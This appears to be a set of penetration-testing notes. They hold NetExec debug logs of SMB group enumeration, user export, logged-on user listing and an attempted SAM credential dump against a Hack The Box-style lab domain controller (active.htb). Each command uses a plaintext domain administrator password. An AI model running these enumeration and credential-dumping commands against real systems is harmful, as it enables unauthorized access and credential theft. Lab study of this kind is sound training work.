           DEBUG    get_groups(filter_term=None, groupName=Performance Monitor Users, groupDomain=DC) => [(15, 'DC', 'Performance Monitor Users', '558', None, None)]                                                        database.py:581
           DEBUG    Update Groups: [{'id': 15, 'domain': 'DC', 'name': 'Performance Monitor Users', 'rid': 558, 'member_count_ad': None, 'last_query_time': None}]                                                           database.py:547
           DEBUG    Updated groups with IDs: [15]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 15                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               559 - Performance Log Users                                                                                                                              smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Performance Log Users, groupDomain=DC) => [(16, 'DC', 'Performance Log Users', '559', None, None)]                                                                database.py:581
           DEBUG    Update Groups: [{'id': 16, 'domain': 'DC', 'name': 'Performance Log Users', 'rid': 559, 'member_count_ad': None, 'last_query_time': None}]                                                               database.py:547
           DEBUG    Updated groups with IDs: [16]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 16                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               562 - Distributed COM Users                                                                                                                              smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Distributed COM Users, groupDomain=DC) => [(17, 'DC', 'Distributed COM Users', '562', None, None)]                                                                database.py:581
           DEBUG    Update Groups: [{'id': 17, 'domain': 'DC', 'name': 'Distributed COM Users', 'rid': 562, 'member_count_ad': None, 'last_query_time': None}]                                                               database.py:547
           DEBUG    Updated groups with IDs: [17]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 17                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               568 - IIS_IUSRS                                                                                                                                          smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=IIS_IUSRS, groupDomain=DC) => [(18, 'DC', 'IIS_IUSRS', '568', None, None)]                                                                                        database.py:581
           DEBUG    Update Groups: [{'id': 18, 'domain': 'DC', 'name': 'IIS_IUSRS', 'rid': 568, 'member_count_ad': None, 'last_query_time': None}]                                                                           database.py:547
           DEBUG    Updated groups with IDs: [18]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 18                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               569 - Cryptographic Operators                                                                                                                            smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Cryptographic Operators, groupDomain=DC) => [(19, 'DC', 'Cryptographic Operators', '569', None, None)]                                                            database.py:581
           DEBUG    Update Groups: [{'id': 19, 'domain': 'DC', 'name': 'Cryptographic Operators', 'rid': 569, 'member_count_ad': None, 'last_query_time': None}]                                                             database.py:547
           DEBUG    Updated groups with IDs: [19]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 19                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               573 - Event Log Readers                                                                                                                                  smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Event Log Readers, groupDomain=DC) => [(20, 'DC', 'Event Log Readers', '573', None, None)]                                                                        database.py:581
           DEBUG    Update Groups: [{'id': 20, 'domain': 'DC', 'name': 'Event Log Readers', 'rid': 573, 'member_count_ad': None, 'last_query_time': None}]                                                                   database.py:547
           DEBUG    Updated groups with IDs: [20]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 20                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               574 - Certificate Service DCOM Access                                                                                                                    smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Certificate Service DCOM Access, groupDomain=DC) => [(21, 'DC', 'Certificate Service DCOM Access', '574', None, None)]                                            database.py:581
           DEBUG    Update Groups: [{'id': 21, 'domain': 'DC', 'name': 'Certificate Service DCOM Access', 'rid': 574, 'member_count_ad': None, 'last_query_time': None}]                                                     database.py:547
           DEBUG    Updated groups with IDs: [21]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 21                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               517 - Cert Publishers                                                                                                                                    smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Cert Publishers, groupDomain=DC) => [(22, 'DC', 'Cert Publishers', '517', None, None)]                                                                            database.py:581
           DEBUG    Update Groups: [{'id': 22, 'domain': 'DC', 'name': 'Cert Publishers', 'rid': 517, 'member_count_ad': None, 'last_query_time': None}]                                                                     database.py:547
           DEBUG    Updated groups with IDs: [22]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 22                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               553 - RAS and IAS Servers                                                                                                                                smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=RAS and IAS Servers, groupDomain=DC) => [(23, 'DC', 'RAS and IAS Servers', '553', None, None)]                                                                    database.py:581
           DEBUG    Update Groups: [{'id': 23, 'domain': 'DC', 'name': 'RAS and IAS Servers', 'rid': 553, 'member_count_ad': None, 'last_query_time': None}]                                                                 database.py:547
           DEBUG    Updated groups with IDs: [23]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 23                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               571 - Allowed RODC Password Replication Group                                                                                                            smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Allowed RODC Password Replication Group, groupDomain=DC) => [(24, 'DC', 'Allowed RODC Password Replication Group', '571', None, None)]                            database.py:581
           DEBUG    Update Groups: [{'id': 24, 'domain': 'DC', 'name': 'Allowed RODC Password Replication Group', 'rid': 571, 'member_count_ad': None, 'last_query_time': None}]                                             database.py:547
           DEBUG    Updated groups with IDs: [24]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 24                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               572 - Denied RODC Password Replication Group                                                                                                             smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Denied RODC Password Replication Group, groupDomain=DC) => [(25, 'DC', 'Denied RODC Password Replication Group', '572', None, None)]                              database.py:581
           DEBUG    Update Groups: [{'id': 25, 'domain': 'DC', 'name': 'Denied RODC Password Replication Group', 'rid': 572, 'member_count_ad': None, 'last_query_time': None}]                                              database.py:547
           DEBUG    Updated groups with IDs: [25]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 25                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               1101 - DnsAdmins                                                                                                                                         smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=DnsAdmins, groupDomain=DC) => [(26, 'DC', 'DnsAdmins', '1101', None, None)]                                                                                       database.py:581
           DEBUG    Update Groups: [{'id': 26, 'domain': 'DC', 'name': 'DnsAdmins', 'rid': 1101, 'member_count_ad': None, 'last_query_time': None}]                                                                          database.py:547
           DEBUG    Updated groups with IDs: [26]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 26                                                                                                                                                                                 smb.py:1284
           DEBUG    Closing connection to: 10.129.172.255                                                                                                                                                                  connection.py:178
```


### --users-export
```sh
└─$ netexec smb 10.129.172.255 -u 'active.htb\administrator' -p 'Ticketmaster1968' --users-export users.txt --debug
[08:44:37] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.172.255'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export='users.txt', groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                      
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None,                             
                    clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                                              
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
[08:44:38] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.172.255, hostname=10.129.172.255, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[08:44:39] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[08:44:40] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[08:44:42] INFO     Creating SMBv1 connection to 10.129.172.255                                                                                                                                                                   smb.py:575
[08:44:43] INFO     SMBv1 disabled on 10.129.172.255                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 4, 'ip': '10.129.172.255', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [4]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[08:44:43] INFO     SMB         10.129.172.255  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[08:44:45] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.172.255                                                                                                                                                                   smb.py:646
[08:44:54] DEBUG    User is admin on 10.129.172.255!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[08:44:54] INFO     SMB         10.129.172.255  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.172.255                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f713b11e0b0>, hosts: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling users_export()                                                                                                                                                                                 connection.py:263
           DEBUG    Trying protocol 139/SMB                                                                                                                                                                                   samruser.py:53
[08:44:55] DEBUG    Connection with protocol 139/SMB failed: Cannot request session (Called Name:10.129.172.255)                                                                                                              samruser.py:59
           DEBUG    Trying protocol 445/SMB                                                                                                                                                                                   samruser.py:53
[08:45:02] DEBUG    Full domain RIDs retrieved: [500, 501, 502, 1103]                                                                                                                                                        samruser.py:131
           DEBUG    Getting user info for users: [500, 501, 502, 1103]                                                                                                                                                       samruser.py:146
[08:45:02] INFO     SMB         10.129.172.255  445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                                                              samruser.py:147
           DEBUG    Calling hSamrOpenUser for RID 500                                                                                                                                                                        samruser.py:151
[08:45:03] INFO     SMB         10.129.172.255  445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain                                     samruser.py:172
[08:45:04] DEBUG    Calling hSamrOpenUser for RID 501                                                                                                                                                                        samruser.py:151
[08:45:05] INFO     SMB         10.129.172.255  445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                   samruser.py:172
[08:45:05] DEBUG    Calling hSamrOpenUser for RID 502                                                                                                                                                                        samruser.py:151
[08:45:07] INFO     SMB         10.129.172.255  445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account                                                    samruser.py:172
[08:45:07] DEBUG    Calling hSamrOpenUser for RID 1103                                                                                                                                                                       samruser.py:151
[08:45:09] INFO     SMB         10.129.172.255  445    DC               SVC_TGS                       2018-07-18 20:14:38 0                                                                                                  samruser.py:172
[08:45:09] INFO     SMB         10.129.172.255  445    DC               Enumerated 4 local users: ACTIVE                                                                                                                     samruser.py:138
[08:45:09] INFO     SMB         10.129.172.255  445    DC               Writing 4 local users to users.txt                                                                                                                   samruser.py:140
[08:45:10] DEBUG    Closing connection to: 10.129.172.255                                                                                                                                                                  connection.py:178
```


### --loggedon-users
https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-with-cache-abuse#wk
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --loggedon-users --debug
[10:42:12] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users='', users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False, tasklist=False,               
                    wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None, get_file=None,                            
                    append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None, clear_obfscripts=False,                    
                    force_ps32=False, no_encode=False)                                                                                                                                                                                      
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[10:42:14] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[10:42:16] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[10:42:18] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[10:42:18] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[10:42:20] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[10:42:29] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[10:42:29] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f2e1fa29ef0>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling loggedon_users()                                                                                                                                                                               connection.py:263
[10:42:31] INFO     SMB         10.129.175.223  445    DC               ACTIVE\DC$                       logon_server:                                                                                                           smb.py:1328
```


### --sam
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --sam --debug  
[13:03:11] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam='regdump',              
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                             
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None,                             
                    clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                                              
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[13:03:13] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[13:03:15] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[13:03:18] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[13:03:18] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[13:03:20] DEBUG    Timeout creating SMBv3 connection to 10.129.175.223                                                                                                                                                           smb.py:619
[13:03:21] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[13:03:30] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[13:03:30] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
